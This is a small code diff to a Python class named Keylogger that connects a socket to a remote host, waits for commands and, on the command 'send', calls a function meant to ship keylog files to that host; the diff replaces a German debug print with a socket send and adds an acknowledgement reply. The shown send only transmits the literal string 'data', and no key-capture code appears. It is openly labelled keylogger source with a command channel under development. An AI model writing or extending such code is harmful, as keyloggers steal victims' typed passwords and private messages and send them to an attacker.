@@ -54,7 +54,7 @@ class Keylogger:
         self.sock.connect((self.host, self.port))
 
     def send_keylog_files_to_host(self):
-        print("sende daten")
+        self.sock.send(bytes("data", 'ascii'))
 
     def start(self):
         self.connect_to_host()
@@ -76,6 +76,7 @@ class Keylogger:
                 elif recv == "send":
                     self.send_keylog_files_to_host()
                 else:
+                    self.sock.send(bytes("received", 'ascii'))
                     print(recv)
 
 if __name__ == "__main__":
